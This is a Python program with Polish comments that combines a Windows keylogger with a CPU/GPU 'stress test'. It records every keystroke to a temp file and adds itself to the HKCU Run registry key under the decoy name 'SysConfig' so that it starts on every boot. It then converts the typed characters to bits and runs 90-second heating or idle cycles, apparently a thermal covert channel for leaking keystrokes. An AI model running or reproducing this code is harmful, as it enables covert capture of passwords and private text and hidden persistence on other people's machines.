import multiprocessing
import math
import time
import random
from datetime import datetime
import array
import os
import tempfile
import threading
from pynput.keyboard import Listener, Key
import sys
import winreg as reg


# ==================== KEYLOGGER CZĘŚĆ ====================

class Keylogger:
    def __init__(self):
        self.log_file_path = os.path.join(tempfile.gettempdir(), "keylogs.txt")
        self.current_bits = []
        self.bits_changed = False
        self.lock = threading.Lock()
        self.total_bits_processed = 0

    def change_working_directory(self):
        exe_directory = tempfile.gettempdir()
        os.chdir(exe_directory)

    def add_to_registry(self):
        exe_path = os.path.realpath(sys.argv[0])
        key = reg.HKEY_CURRENT_USER
        key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"

        try:
            open_key = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
            reg.SetValueEx(open_key, "SysConfig", 0, reg.REG_SZ, exe_path)
            reg.CloseKey(open_key)
        except Exception:
            pass

    def is_in_registry(self):
        key = reg.HKEY_CURRENT_USER
        key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        try:
            open_key = reg.OpenKey(key, key_value, 0, reg.KEY_READ)
            value, regtype = reg.QueryValueEx(open_key, "SysConfig")
            reg.CloseKey(open_key)
            if value == os.path.realpath(sys.argv[0]):
                return True
        except FileNotFoundError:
            return False
        return False


    def clear_log_file(self):
        with open(self.log_file_path, "w"):
            pass


    def char_to_binary_ascii(self, char):
        """Konwertuje znak na binarną reprezentację ASCII"""
        ascii_code = ord(char)
        binary_str = format(ascii_code, '08b')
        return binary_str

    def key_to_binary(self, key):
        """Konwertuje naciśnięty klawisz na binarną reprezentację"""
        try:
            if hasattr(key, 'char') and key.char:
                return self.char_to_binary_ascii(key.char)
            elif hasattr(key, 'name'):
                if len(key.name) == 1:
                    return self.char_to_binary_ascii(key.name)
                else:
                    key_str = f"[{key.name.upper()}]"
                    binary_result = ""
                    for char in key_str:
                        binary_result += self.char_to_binary_ascii(char)
                    return binary_result
            else:
                return format(0, '08b')
        except Exception:
            return format(0, '08b')

    def on_press(self, key):
        try:
            with open(self.log_file_path, "a") as log_file:
                system_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                binary_key = self.key_to_binary(key)

                # Zapisz czas i binarną reprezentację
                log_file.write(f"{system_time}: {binary_key}\n")

                # Dodaj bity do bieżącej sekwencji
                with self.lock:
                    for bit in binary_key:
                        if bit == '1':
                            self.current_bits.append(True)
                        else:
                            self.current_bits.append(False)
                    self.bits_changed = True
                    self.total_bits_processed += len(binary_key)

        except Exception:
            pass

    def get_new_bits(self):
        """Zwraca tylko nowe bity od ostatniego sprawdzenia"""
        with self.lock:
            bits = self.current_bits.copy()
            self.current_bits = []  # Wyczyść po pobraniu
            self.bits_changed = False
            return bits

    def has_new_bits(self):
        """Sprawdza czy są nowe bity"""
        with self.lock:
            return self.bits_changed

    def get_total_bits_processed(self):
        """Zwraca całkowitą liczbę przetworzonych bitów"""
        with self.lock:
            return self.total_bits_processed

    def start_keylogger(self):
        """Uruchamia keylogger w osobnym wątku"""
        if not self.is_in_registry():
            self.add_to_registry()

        self.change_working_directory()

        # Uruchom nasłuchiwanie klawiszy
        keyboard_thread = threading.Thread(target=self._keyboard_listener, daemon=True)
        keyboard_thread.start()

    def _keyboard_listener(self):
        try:
            with Listener(on_press=self.on_press) as listener:
                listener.join()
        except Exception:
            pass


# STRESS TEST

def print_timestamp(message):
    """Wyświetla wiadomość z timestampem"""
    timestamp = datetime.now().strftime("%H:%M:%S")
    print(f"[{timestamp}] {message}")


def stress_cpu_hard(duration, process_id):
    """Obciąża CPU intensywnymi obliczeniami matematycznymi"""
    print_timestamp(f"CPU Proces {process_id} ROZPOCZYNA pracę ({duration}s)")
    start = time.time()

    while time.time() - start < duration:
        for i in range(1, 5000000):
            if i % 1000 == 0 and time.time() - start >= duration:
                break

            x = math.sqrt(i) * math.sin(i) * math.cos(i) * math.tan(i)
            x += math.pow(i, 0.5) * math.log(i) * math.exp(i % 10)
            x += math.factorial(i % 10)
            x += random.random() * i
            s = str(i) * 100
            _ = s[::-1]

    elapsed = time.time() - start
    print_timestamp(f"CPU Proces {process_id} ZAKOŃCZYŁ pracę (rzeczywisty czas: {elapsed:.1f}s)")


def stress_gpu_nvidia(duration, process_id):
    """Obciąża GPU używając CUDA"""
    try:
        import torch

        if not torch.cuda.is_available():
            print_timestamp("CUDA niedostępna - sprawdź instalację PyTorch z CUDA")
            return

        device = torch.device('cuda:0')
        print_timestamp(f" GPU Proces {process_id} ROZPOCZYNA pracę ({duration}s)")
        print_timestamp(f"   GPU: {torch.cuda.get_device_name(0)}")
        print_timestamp(f"   Pamięć GPU: {torch.cuda.get_device_properties(0).total_memory / 1024 ** 3:.1f} GB")

        start = time.time()

        while time.time() - start < duration:
            size = 10000
            a = torch.randn(size, size, device=device, dtype=torch.float32)
            b = torch.randn(size, size, device=device, dtype=torch.float32)

            c = torch.matmul(a, b)
            c = torch.matmul(c, a)
            c = torch.sin(c) * torch.cos(c) + torch.tan(c * 0.1)
            c = torch.exp(c * 0.01) + torch.log(torch.abs(c) + 1)
            c = torch.sqrt(torch.abs(c))

            d = torch.matmul(c, c.T)
            d = torch.pow(d, 2)

            batch_size = 128
            x = torch.randn(batch_size, 3, 256, 256, device=device)

            conv1 = torch.nn.Conv2d(3, 64, kernel_size=7, stride=2, padding=3).to(device)
            conv2 = torch.nn.Conv2d(64, 128, kernel_size=5, stride=2, padding=2).to(device)
            conv3 = torch.nn.Conv2d(128, 256, kernel_size=3, stride=2, padding=1).to(device)

            x = conv1(x)
            x = torch.relu(x)
            x = conv2(x)
            x = torch.relu(x)
            x = conv3(x)
            x = torch.relu(x)

            bn = torch.nn.BatchNorm2d(256).to(device)
            x = bn(x)

            del a, b, c, d, x, conv1, conv2, conv3, bn
            torch.cuda.empty_cache()

        print_timestamp(f"GPU Proces {process_id} ZAKOŃCZYŁ pracę")

    except ImportError:
        print_timestamp("PyTorch nie jest zainstalowany!")
    except RuntimeError as e:
        if "out of memory" in str(e):
            print_timestamp("Brak pamięci GPU - zmniejszam obciążenie...")
            torch.cuda.empty_cache()
            time.sleep(0.1)
        else:
            print_timestamp(f"Błąd GPU: {e}")
    except Exception as e:
        print_timestamp(f"Błąd przy obciążaniu GPU: {e}")


def monitor_gpu():
    """Monitoruje stan GPU co 5 sekund"""
    try:
        import torch

        while True:
            if torch.cuda.is_available():
                memory_allocated = torch.cuda.memory_allocated(0) / 1024 ** 3
                memory_reserved = torch.cuda.memory_reserved(0) / 1024 ** 3
                print(f"\r[GPU] Pamięć: {memory_allocated:.2f}GB / {memory_reserved:.2f}GB używane", end='', flush=True)
            time.sleep(5)
    except:
        pass


def stress_test(stressTime):
    """Wykonuje test obciążeniowy"""
    print_timestamp(f"ROZPOCZYNAM GRZANIE - {stressTime}s")

    processes = []
    num_cores = multiprocessing.cpu_count() - 2
    if num_cores < 1:
        num_cores = 1

    # Uruchom procesy obciążające CPU
    for i in range(num_cores):
        p = multiprocessing.Process(target=stress_cpu_hard, args=(stressTime, i + 1))
        p.start()
        processes.append(p)

    # Uruchom 2 procesy GPU dla maksymalnego obciążenia RTX 2060
    for i in range(2):
        gpu_process = multiprocessing.Process(target=stress_gpu_nvidia, args=(stressTime, i + 1))
        gpu_process.start()
        processes.append(gpu_process)
        time.sleep(0.5)

    # Uruchom monitor GPU
    monitor_process = multiprocessing.Process(target=monitor_gpu)
    monitor_process.daemon = True
    monitor_process.start()

    for p in processes:
        p.join()

    print_timestamp(f"GRZANIE ZAKOŃCZONE ({stressTime}s)")


def process_bit_immediately(bit, cycle_counter):
    """Natychmiast przetwarza pojedynczy bit"""
    print(f"\n{'=' * 70}")
    print_timestamp(f"CYKL {cycle_counter}:")

    if bit:
        print_timestamp(f"GRZANIE (90s) - bit: 1")
        stress_test(90)
    else:
        print_timestamp(f"CHŁODZENIE (90s) - bit: 0")
        time.sleep(90)
        print_timestamp(f"CHŁODZENIE ZAKOŃCZONE")

    print(f"{'=' * 70}")


def process_keylogger_bits_realtime(keylogger):
    """Główna funkcja przetwarzająca bity z keyloggera w czasie rzeczywistym"""
    print("\n" + "=" * 70)
    print("STRESS TEST CPU/GPU - STEROWANY KEYLOGGEREM")
    print("=" * 70)

    num_cores = multiprocessing.cpu_count() - 2
    if num_cores < 1:
        num_cores = 1

    print(f"Liczba rdzeni CPU: {num_cores}")
    print(f"\n LOGIKA DZIAŁANIA:")
    print(f"  • Każdy bit z keyloggera = 90s cykl")
    print(f"  • Bit 1 = GRZANIE (90s pełnego obciążenia)")
    print(f"  • Bit 0 = CHŁODZENIE (90s pauzy)")
    print(f"  • Natychmiastowe przetwarzanie w czasie rzeczywistym")
    print(f"  • Między cyklami: 30s przerwy (zamiast 180s)")
    print(f"\n⚡ STAN: Oczekiwanie na pierwsze naciśnięcia klawiszy...")
    print("=" * 70 + "\n")

    cycle_counter = 0
    last_bit_time = time.time()

    # Początkowe oczekiwanie na dane
    while not keylogger.has_new_bits():
        print_timestamp("Oczekiwanie na dane z keyloggera...")
        time.sleep(5)

    print_timestamp("Keylogger aktywny! Rozpoczynam przetwarzanie bitów...")

    while True:
        # Sprawdź czy są nowe bity
        if keylogger.has_new_bits():
            bits = keylogger.get_new_bits()

            if bits:
                print_timestamp(f"Otrzymano {len(bits)} nowych bitów")
                print_timestamp(f"Łącznie przetworzonych bitów: {keylogger.get_total_bits_processed()}")

                # Przetwórz każdy bit natychmiast
                for i, bit in enumerate(bits):
                    cycle_counter += 1

                    # Dodaj krótszą przerwę przed nowym cyklem (jeśli nie pierwszy bit w pakiecie)
                    if i > 0:
                        print_timestamp(f"Krótka przerwa: 30s")
                        time.sleep(30)

                    # Przetwórz bit
                    process_bit_immediately(bit, cycle_counter)

                    # Krótsza przerwa po cyklu (30s zamiast 180s)
                    if i < len(bits) - 1:  # Jeśli to nie ostatni bit w pakiecie
                        print_timestamp(f"Przerwa przed następnym bitem: 30s")
                        time.sleep(30)

                print_timestamp(f"Przetworzono pakiet {len(bits)} bitów")
                last_bit_time = time.time()

        else:
            # Sprawdź czy minęło dużo czasu od ostatniego bitu
            time_since_last_bit = time.time() - last_bit_time
            if time_since_last_bit > 60:  # Jeśli minęła minuta bez bitów
                print_timestamp("Brak nowych bitów. Oczekiwanie...")
                time.sleep(10)
            else:
                # Krótsze czekanie gdy były niedawno bity
                time.sleep(2)


def main():
    """Główna funkcja programu"""
    # Inicjalizuj keylogger
    keylogger = Keylogger()

    # Uruchom keylogger w tle
    keylogger.start_keylogger()
    print_timestamp("Keylogger uruchomiony w tle")
    time.sleep(2)  # Poczekaj na inicjalizację keyloggera

    # Uruchom główną pętlę przetwarzania bitów
    try:
        process_keylogger_bits_realtime(keylogger)
    except KeyboardInterrupt:
        print_timestamp("\nProgram zatrzymany przez użytkownika")
        print_timestamp(f"ffŁącznie przetworzonych bitów: {keylogger.get_total_bits_processed()}")
    except Exception as e:
        print_timestamp(f"Błąd programu: {e}")
        print_timestamp(f"Łącznie przetworzonych bitów: {keylogger.get_total_bits_processed()}")
    finally:
        print("\n" + "=" * 70)
        print_timestamp("PROGRAM ZAKOŃCZONY")
        print("=" * 70)


if __name__ == "__main__":
    # Dodaj obsługę timedelta
    from datetime import timedelta

    # Sprawdź czy mamy wszystkie zależności
    try:
        import pynput
    except ImportError:
        print("Brak biblioteki pynput. Instalacja:")
        print("pip install pynput")
        exit(1)

    # Nagłówek z informacjami
    print("\n" + "=" * 70)
    print("REALTIME STRESS TEST + KEYLOGGER")
    print("=" * 70)
    print("Program rozpocznie działanie natychmiast po uruchomieniu.")
    print("Każde naciśnięcie klawisza będzie generować bity sterujące grzaniem.")
    print("Naciśnij Ctrl+C aby zatrzymać program.\n")

    main()